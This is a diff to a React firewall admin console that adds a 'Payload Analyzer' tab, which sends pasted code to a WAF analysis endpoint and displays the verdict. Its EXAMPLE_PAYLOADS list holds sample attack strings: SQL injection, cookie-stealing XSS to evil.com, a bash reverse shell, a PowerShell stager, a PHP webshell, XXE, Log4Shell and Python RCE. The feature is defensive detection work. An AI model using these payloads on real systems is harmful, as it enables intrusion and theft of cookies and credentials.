@@ -1,10 +1,10 @@
 // Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
 // GhostOS™ Firewall — ProxhqVPN Next-Generation Firewall System
-import { useState, useRef, useEffect } from "react";
+import { useState, useRef, useEffect, useCallback } from "react";
 import {
   Shield, Terminal, AlertTriangle, Globe2, Rss, Layers, Link2,
   Ban, BarChart3, Download, Trash2, RefreshCw, Zap, Eye,
-  Play, Plus, Search, Copy, Check,
+  Play, Plus, Search, Copy, Check, FlaskConical, ChevronDown, ChevronRight,
 } from "lucide-react";
 import {
   useListGhostOsRules, useCreateGhostOsRule, useDeleteGhostOsRule, useUpdateGhostOsRule,
@@ -26,11 +26,13 @@ const TAB_ICONS: Record<string, React.ReactNode> = {
   overview: <Shield size={13} />, ghostos: <Terminal size={13} />, ips: <AlertTriangle size={13} />,
   dpi: <Eye size={13} />, threat: <Globe2 size={13} />, zones: <Layers size={13} />,
   rules: <Link2 size={13} />, blacklist: <Ban size={13} />, analytics: <BarChart3 size={13} />, export: <Download size={13} />,
+  analyzer: <FlaskConical size={13} />,
 };
 const TABS = [
   { id:"overview", label:"Overview" }, { id:"ghostos", label:"GhostOS™" }, { id:"ips", label:"IPS Engine" },
   { id:"dpi", label:"DPI Engine" }, { id:"threat", label:"Threat Intel" }, { id:"zones", label:"Zones" },
   { id:"rules", label:"Rules" }, { id:"blacklist", label:"Blacklist" }, { id:"analytics", label:"Analytics" }, { id:"export", label:"Export" },
+  { id:"analyzer", label:"Payload Analyzer" },
 ];
 const SEV_COLOR: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff", info:"#888" };
 const TRUST_COLOR: Record<string,string> = { trusted:"#00ff88", untrusted:"#ff4444", dmz:"#ff9900", management:"#4488ff" };
@@ -822,6 +824,320 @@ function ExportTab() {
   );
 }
 
+// ══════════════════════════════════════════════════════════════════════════════
+// ── Payload Code Analyzer Tab ─────────────────────────────────────────────────
+// ══════════════════════════════════════════════════════════════════════════════
+
+interface FlaggedToken { line: number; col: number; token: string; reason: string; severity: string; score: number }
+interface ObfFlag     { type: string; detail: string; score: number }
+interface StructFlag  { type: string; detail: string; score: number }
+interface WAFMatch    { name: string; attackType: string; severity: string; pattern: string }
+interface AnalysisResult {
+  verdict:          "malicious" | "suspicious" | "clean";
+  confidence:       number;
+  anomalyScore:     number;
+  detectedLanguage: string;
+  entropy:          number;
+  threatCategories: string[];
+  recommendation:   string;
+  flaggedTokens:    FlaggedToken[];
+  obfuscationFlags: ObfFlag[];
+  structuralFlags:  StructFlag[];
+  wafRuleMatches:   WAFMatch[];
+  summary:          { tokenHits: number; obfuscation: number; structural: number; wafMatches: number };
+}
+
+const EXAMPLE_PAYLOADS: Record<string, { label: string; code: string }> = {
+  sqli:   { label: "SQL Injection",    code: "' UNION SELECT username, password FROM users WHERE '1'='1'; -- " },
+  xss:    { label: "XSS Payload",      code: '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">' },
+  shell:  { label: "Bash Reverse Shell", code: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
+  ps:     { label: "PowerShell Stager", code: "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMAV" },
+  php:    { label: "PHP Webshell",     code: '<?php system($_GET["cmd"]); ?>' },
+  xxe:    { label: "XXE Injection",    code: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
+  log4:   { label: "Log4Shell",        code: '${jndi:ldap://evil.com:1234/a}' },
+  python: { label: "Python RCE",       code: "__import__('os').system('id; cat /etc/passwd')" },
+  proto:  { label: "Prototype Pollution", code: '{"__proto__": {"isAdmin": true, "role": "superuser"}}' },
+};
+
+const VERDICT_STYLE: Record<string, { bg: string; border: string; text: string; glow: string }> = {
+  malicious:  { bg: "#1a0005", border: "#ff2244", text: "#ff4466", glow: "#ff224440" },
+  suspicious: { bg: "#1a0e00", border: "#ff8800", text: "#ffaa33", glow: "#ff880040" },
+  clean:      { bg: "#001a0a", border: "#00cc55", text: "#00ff88", glow: "#00cc5540" },
+};
+const SEV_C: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff" };
+
+function TokenRow({ t, idx }: { t: FlaggedToken; idx: number }) {
+  const [exp, setExp] = useState(false);
+  const c = SEV_C[t.severity] ?? "#888";
+  return (
+    <div style={{ borderBottom:"1px solid #111", padding:"6px 0" }}>
+      <div style={{ display:"flex", alignItems:"center", gap:8, cursor:"pointer" }} onClick={() => setExp(e => !e)}>
+        {exp ? <ChevronDown size={10} color="#555"/> : <ChevronRight size={10} color="#555"/>}
+        <span style={{ color:c, fontFamily:"monospace", fontSize:10, fontWeight:700, letterSpacing:1, minWidth:70, textTransform:"uppercase" }}>{t.severity}</span>
+        <code style={{ color:"#ff9933", fontSize:10, background:"#1a0f00", padding:"1px 5px", borderRadius:3, maxWidth:220, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{t.token}</code>
+        <span style={{ color:"#555", fontSize:9 }}>L{t.line}:{t.col}</span>
+        <span style={{ marginLeft:"auto", color:"#ff6600", fontSize:9, fontFamily:"monospace" }}>+{t.score}</span>
+      </div>
+      {exp && (
+        <div style={{ paddingLeft:24, marginTop:4, color:"#777", fontSize:10, lineHeight:1.5 }}>
+          {t.reason}
+        </div>
+      )}
+    </div>
+  );
+}
+
+function FlagSection({ title, items, color }: { title: string; items: Array<{ type: string; detail: string; score: number }>; color: string }) {
+  if (!items.length) return null;
+  return (
+    <div style={{ background:"#0a0a0a", border:`1px solid ${color}33`, borderRadius:8, padding:14, marginBottom:12 }}>
+      <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color, marginBottom:8 }}>{title}</div>
+      {items.map((f, i) => (
+        <div key={i} style={{ display:"flex", gap:8, padding:"5px 0", borderBottom: i < items.length-1 ? "1px solid #111" : "none" }}>
+          <code style={{ color:"#888", fontSize:9, background:"#111", padding:"1px 5px", borderRadius:3, flexShrink:0 }}>{f.type}</code>
+          <span style={{ color:"#aaa", fontSize:10, flex:1 }}>{f.detail}</span>
+          <span style={{ color, fontSize:9, fontFamily:"monospace", flexShrink:0 }}>+{f.score}</span>
+        </div>
+      ))}
+    </div>
+  );
+}
+
+function PayloadAnalyzerTab() {
+  const [code, setCode]           = useState("");
+  const [language, setLanguage]   = useState("auto");
+  const [context, setContext]     = useState("http_body");
+  const [result, setResult]       = useState<AnalysisResult | null>(null);
+  const [loading, setLoading]     = useState(false);
+  const [error, setError]         = useState<string | null>(null);
+  const [showRaw, setShowRaw]     = useState(false);
+  const textareaRef               = useRef<HTMLTextAreaElement>(null);
+
+  const analyze = useCallback(async () => {
+    if (!code.trim()) return;
+    setLoading(true);
+    setError(null);
+    setResult(null);
+    try {
+      const res = await fetch("/api/waf/analyze-code", {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({
+          code,
+          language: language === "auto" ? undefined : language,
+          context,
+          sourceIp: "admin-console",
+        }),
+      });
+      if (!res.ok) { setError(`Server error: ${res.status}`); return; }
+      setResult(await res.json() as AnalysisResult);
+    } catch (e) {
+      setError(String(e));
+    } finally {
+      setLoading(false);
+    }
+  }, [code, language, context]);
+
+  const loadExample = useCallback((key: string) => {
+    const ex = EXAMPLE_PAYLOADS[key];
+    if (ex) { setCode(ex.code); setResult(null); }
+  }, []);
+
+  const vs   = result ? VERDICT_STYLE[result.verdict]! : null;
+  const conf = result?.confidence ?? 0;
+
+  return (
+    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:16, alignItems:"start" }}>
+
+      {/* ── Left: Editor Panel ── */}
+      <div>
+        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16, marginBottom:12 }}>
+          <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:12 }}>
+            <FlaskConical size={14} color="#00ff88"/>
+            <span style={{ fontFamily:"monospace", fontWeight:800, fontSize:13, color:"#fff" }}>Payload Code Analyzer</span>
+            <span style={{ fontSize:9, color:"#333", marginLeft:"auto" }}>Multi-layer: tokenization · entropy · structural · WAF</span>
+          </div>
+
+          {/* Controls */}
+          <div style={{ display:"flex", gap:8, marginBottom:10, flexWrap:"wrap" }}>
+            <select value={language} onChange={e => setLanguage(e.target.value)}
+              style={{ background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"4px 8px", fontSize:10, fontFamily:"monospace" }}>
+              {["auto","sql","javascript","python","shell","powershell","php","xml","html","json"].map(l =>
+                <option key={l} value={l}>{l === "auto" ? "Auto-detect language" : l.toUpperCase()}</option>
+              )}
+            </select>
+            <select value={context} onChange={e => setContext(e.target.value)}
+              style={{ background:"#111", border:"1px solid #222", color:"#ccc", borderRadius:4, padding:"4px 8px", fontSize:10, fontFamily:"monospace" }}>
+              {["http_body","form_field","url_param","header","file_upload","cookie"].map(c =>
+                <option key={c} value={c}>{c.replace(/_/g," ")}</option>
+              )}
+            </select>
+          </div>
+
+          {/* Code textarea */}
+          <textarea
+            ref={textareaRef}
+            value={code}
+            onChange={e => { setCode(e.target.value); setResult(null); }}
+            placeholder="Paste any code, payload, or HTTP body here for deep malicious-code analysis…&#10;&#10;Examples: SQL injection, XSS, shell commands, PowerShell, PHP, XML/XXE, Python, Log4Shell"
+            style={{ width:"100%", minHeight:240, background:"#050505", border:"1px solid #1a1a1a", color:"#00ff88", fontFamily:"'Courier New',monospace", fontSize:11, padding:12, borderRadius:6, resize:"vertical", outline:"none", boxSizing:"border-box", lineHeight:1.6 }}
+          />
+
+          <div style={{ display:"flex", gap:8, marginTop:10, alignItems:"center" }}>
+            <button onClick={analyze} disabled={loading || !code.trim()}
+              style={{ background: loading ? "#111" : "#00ff88", color:"#000", border:"none", borderRadius:6, padding:"8px 20px", fontFamily:"monospace", fontWeight:800, fontSize:12, cursor: loading ? "not-allowed" : "pointer", opacity: !code.trim() ? 0.4 : 1 }}>
+              {loading ? "⟳ Analyzing…" : "🔬 Analyze Payload"}
+            </button>
+            <button onClick={() => { setCode(""); setResult(null); setError(null); }}
+              style={{ background:"none", border:"1px solid #222", color:"#555", borderRadius:6, padding:"8px 14px", fontSize:11, cursor:"pointer" }}>
+              Clear
+            </button>
+            {result && (
+              <button onClick={() => setShowRaw(r => !r)}
+                style={{ background:"none", border:"1px solid #222", color:"#555", borderRadius:6, padding:"8px 14px", fontSize:11, cursor:"pointer", marginLeft:"auto" }}>
+                {showRaw ? "Hide Raw" : "Raw JSON"}
+              </button>
+            )}
+          </div>
+
+          {error && <div style={{ marginTop:10, color:"#ff4466", fontSize:11, fontFamily:"monospace" }}>⚠ {error}</div>}
+        </div>
+
+        {/* Example payloads */}
+        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
+          <div style={{ fontFamily:"monospace", fontSize:10, color:"#444", marginBottom:8 }}>EXAMPLE PAYLOADS</div>
+          <div style={{ display:"flex", flexWrap:"wrap", gap:6 }}>
+            {Object.entries(EXAMPLE_PAYLOADS).map(([k, v]) => (
+              <button key={k} onClick={() => loadExample(k)}
+                style={{ background:"#111", border:"1px solid #222", color:"#888", borderRadius:4, padding:"4px 10px", fontSize:10, fontFamily:"monospace", cursor:"pointer" }}>
+                {v.label}
+              </button>
+            ))}
+          </div>
+        </div>
+      </div>
+
+      {/* ── Right: Results Panel ── */}
+      <div>
+        {!result && !loading && (
+          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:40, textAlign:"center" }}>
+            <FlaskConical size={32} color="#1a1a1a" style={{ marginBottom:12 }}/>
+            <p style={{ color:"#333", fontFamily:"monospace", fontSize:12 }}>Paste a payload and click Analyze to run the multi-layer inspection engine</p>
+            <p style={{ color:"#222", fontSize:10, marginTop:8 }}>Detection layers: token scanning · obfuscation · structural analysis · 100+ WAF rules · Shannon entropy</p>
+          </div>
+        )}
+
+        {loading && (
+          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:40, textAlign:"center" }}>
+            <div style={{ fontSize:24, marginBottom:12, animation:"spin 1s linear infinite" }}>⟳</div>
+            <p style={{ color:"#555", fontFamily:"monospace", fontSize:12 }}>Running detection layers…</p>
+          </div>
+        )}
+
+        {result && vs && (
+          <div>
+            {/* Verdict card */}
+            <div style={{ background: vs.bg, border:`2px solid ${vs.border}`, borderRadius:10, padding:18, marginBottom:12, boxShadow:`0 0 20px ${vs.glow}` }}>
+              <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:12 }}>
+                <div>
+                  <div style={{ fontFamily:"monospace", fontSize:22, fontWeight:900, color: vs.text, letterSpacing:2, textTransform:"uppercase" }}>
+                    {result.verdict === "malicious" ? "⛔ MALICIOUS" : result.verdict === "suspicious" ? "⚠ SUSPICIOUS" : "✓ CLEAN"}
+                  </div>
+                  <div style={{ color:"#555", fontSize:10, fontFamily:"monospace", marginTop:2 }}>
+                    Language: <span style={{ color:"#888" }}>{result.detectedLanguage.toUpperCase()}</span> · Entropy: <span style={{ color:"#888" }}>{result.entropy}</span>
+                  </div>
+                </div>
+                <div style={{ textAlign:"right" }}>
+                  <div style={{ fontSize:28, fontWeight:900, fontFamily:"monospace", color: vs.text }}>{result.anomalyScore}</div>
+                  <div style={{ fontSize:9, color:"#555", fontFamily:"monospace" }}>ANOMALY SCORE</div>
+                </div>
+              </div>
+
+              {/* Confidence bar */}
+              <div style={{ marginBottom:10 }}>
+                <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
+                  <span style={{ fontSize:9, color:"#555", fontFamily:"monospace" }}>CONFIDENCE</span>
+                  <span style={{ fontSize:11, color: vs.text, fontFamily:"monospace", fontWeight:700 }}>{conf}%</span>
+                </div>
+                <div style={{ background:"#111", borderRadius:4, height:6, overflow:"hidden" }}>
+                  <div style={{ width:`${conf}%`, height:"100%", background: vs.border, borderRadius:4, transition:"width 0.6s ease" }}/>
+                </div>
+              </div>
+
+              {/* Signal summary */}
+              <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
+                {[
+                  { label:"Token Hits",   val: result.summary.tokenHits,   color:"#ff6600" },
+                  { label:"Obfuscation",  val: result.summary.obfuscation,  color:"#cc44ff" },
+                  { label:"Structural",   val: result.summary.structural,   color:"#4488ff" },
+                  { label:"WAF Matches",  val: result.summary.wafMatches,   color:"#ff2244" },
+                ].map(s => (
+                  <div key={s.label} style={{ background:"#0a0a0a", borderRadius:6, padding:"6px 10px", textAlign:"center", flex:1 }}>
+                    <div style={{ fontSize:16, fontWeight:900, fontFamily:"monospace", color: s.val > 0 ? s.color : "#333" }}>{s.val}</div>
+                    <div style={{ fontSize:8, color:"#444", textTransform:"uppercase", letterSpacing:1 }}>{s.label}</div>
+                  </div>
+                ))}
+              </div>
+
+              {/* Threat categories */}
+              {result.threatCategories.length > 0 && (
+                <div style={{ marginTop:10, display:"flex", flexWrap:"wrap", gap:4 }}>
+                  {result.threatCategories.map(c => (
+                    <span key={c} style={{ background:"#ff224422", color:"#ff4466", border:"1px solid #ff224444", borderRadius:3, padding:"2px 7px", fontSize:9, fontFamily:"monospace", textTransform:"uppercase" }}>{c.replace(/_/g," ")}</span>
+                  ))}
+                </div>
+              )}
+            </div>
+
+            {/* Recommendation */}
+            <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:12, marginBottom:12 }}>
+              <div style={{ fontFamily:"monospace", fontSize:10, color:"#444", marginBottom:6 }}>RECOMMENDED ACTION</div>
+              <p style={{ margin:0, fontSize:11, color: vs.text, fontFamily:"monospace", lineHeight:1.5 }}>{result.recommendation}</p>
+            </div>
+
+            {/* Flagged tokens */}
+            {result.flaggedTokens.length > 0 && (
+              <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, marginBottom:12 }}>
+                <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff6600", marginBottom:8 }}>
+                  ⚡ Flagged Tokens ({result.flaggedTokens.length})
+                </div>
+                {result.flaggedTokens.map((t, i) => <TokenRow key={i} t={t} idx={i} />)}
+              </div>
+            )}
+
+            <FlagSection title="🔐 Obfuscation Signals" items={result.obfuscationFlags} color="#cc44ff" />
+            <FlagSection title="🏗 Structural / Behavioral" items={result.structuralFlags} color="#4488ff" />
+
+            {/* WAF rule matches */}
+            {result.wafRuleMatches.length > 0 && (
+              <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, marginBottom:12 }}>
+                <div style={{ fontFamily:"monospace", fontSize:11, fontWeight:700, color:"#ff2244", marginBottom:8 }}>
+                  🛡 WAF Rule Matches ({result.wafRuleMatches.length})
+                </div>
+                {result.wafRuleMatches.map((w, i) => (
+                  <div key={i} style={{ display:"flex", gap:8, padding:"5px 0", borderBottom: i < result.wafRuleMatches.length-1 ? "1px solid #111" : "none", alignItems:"center" }}>
+                    <span style={{ color: SEV_C[w.severity] ?? "#888", fontSize:9, fontFamily:"monospace", fontWeight:700, minWidth:60, textTransform:"uppercase" }}>{w.severity}</span>
+                    <span style={{ color:"#ccc", fontSize:10, flex:1 }}>{w.name}</span>
+                    <span style={{ color:"#444", fontSize:9, background:"#111", padding:"1px 5px", borderRadius:3 }}>{w.attackType}</span>
+                  </div>
+                ))}
+              </div>
+            )}
+
+            {/* Raw JSON */}
+            {showRaw && (
+              <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
+                <div style={{ fontFamily:"monospace", fontSize:10, color:"#333", marginBottom:6 }}>RAW JSON RESPONSE</div>
+                <pre style={{ margin:0, fontSize:9, color:"#555", overflowX:"auto", maxHeight:300 }}>{JSON.stringify(result, null, 2)}</pre>
+              </div>
+            )}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
 // ── Main ──────────────────────────────────────────────────────────────────
 export default function Firewall() {
   const [tab, setTab] = useState("overview");
@@ -854,6 +1170,7 @@ export default function Firewall() {
       {tab==="blacklist"&&<BlacklistTab/>}
       {tab==="analytics"&&<AnalyticsTab/>}
       {tab==="export"&&<ExportTab/>}
+      {tab==="analyzer"&&<PayloadAnalyzerTab/>}
     </div>
   );
 }
